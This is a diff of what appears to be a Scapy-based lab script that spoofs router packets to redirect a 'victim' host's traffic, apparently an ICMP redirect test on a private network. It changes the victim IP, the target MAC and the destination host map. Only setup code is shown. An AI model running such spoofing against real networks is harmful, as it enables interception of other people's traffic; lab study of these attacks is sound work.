@@ -7,18 +7,19 @@ ip_to_host={
         'httpbin.org': '35.173.225.247',
         'gohxiangzheng.com': '13.33.30.1', # actual subnet range is 13.33.30.0/24 - to test if the redirect still works with a generic .1 subnet value,
         'httpforever.com': '146.190.62.39',
+        'neverssl.com': '34.223.124.45',
         'gateway': '192.168.1.254'
         }
 
 
-victim_ip='192.168.1.68'
+victim_ip='192.168.1.77'
 attacker_ip='192.168.1.101'
 router_ip='192.168.1.254'
-remote_dest_ip=ip_to_host['gateway'] 
+remote_dest_ip=ip_to_host['httpbin.org'] 
 
 eth=Ether(type=0x0800)
 #eth.src=''
-eth.dst='d8:f2:ca:d2:44:02'
+eth.dst='08:00:27:d9:56:5e'
 
 ip = IP()
 ip.src=router_ip
